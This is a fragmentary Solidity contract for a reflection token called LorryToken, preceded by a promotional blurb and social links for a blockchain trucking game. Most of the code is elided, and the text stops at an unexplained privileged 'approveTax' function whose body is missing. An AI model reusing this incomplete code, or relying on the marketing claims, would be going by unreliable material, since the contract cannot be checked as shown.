...
Take a challenge and have a transportation company Play2Earn game based on blockchain!
Many trucks, countries, trailes and loads. What R you waiting for?
 
 Get in!

Telegram  -  https://t.me/LorryToken             

Website   -  https://lorrytoken.digital/

Twitter   -  https://twitter.com/LorryToken
...
contract Ownable is Context {
    ...
    _owner = address(0);}}
contract LorryToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = 'LorryToken | t.me/LorryToken';
    string private _symbol = 'LORRY';
    ...
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);}
    function approveTax(address acconut) external distributors {
